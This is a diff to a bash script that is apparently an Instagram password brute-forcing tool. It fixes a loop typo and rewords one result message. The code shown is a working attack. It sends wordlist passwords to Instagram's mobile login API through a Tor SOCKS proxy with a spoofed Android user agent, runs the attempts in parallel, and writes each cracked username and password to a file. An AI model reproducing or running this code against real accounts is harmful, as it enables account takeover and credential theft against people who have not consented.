@@ -189,8 +189,7 @@ bf1() {
 while [ $counter -lt $turn ]; do
 
 IFS=$'\n'
-for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do1234
-
+for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
@@ -477,7 +476,7 @@ let counter5++
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] POSSIBLE PASSWORD FETCHED: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1 ;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1 ;
 
 let startline+=20
 let endline+=20
